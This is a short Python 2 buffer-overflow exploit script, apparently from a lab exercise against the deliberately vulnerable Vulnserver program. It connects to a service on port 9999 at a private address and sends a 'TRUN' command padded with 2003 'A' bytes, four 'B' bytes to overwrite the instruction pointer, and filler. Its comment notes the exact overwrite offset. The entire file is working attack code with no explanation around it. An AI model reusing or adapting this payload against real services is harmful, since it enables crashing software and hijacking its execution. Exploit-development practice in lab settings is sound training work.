#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.6"
port=9999

#Exact match at offset 2003
#look for 42 (B)

string="A"*2003+"B"*4+"C"*(3000 - 2003 - 4)

print "Fuzzing Connection with %s bytes" % len(string)
buffer = "TRUN /.:/" + string
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()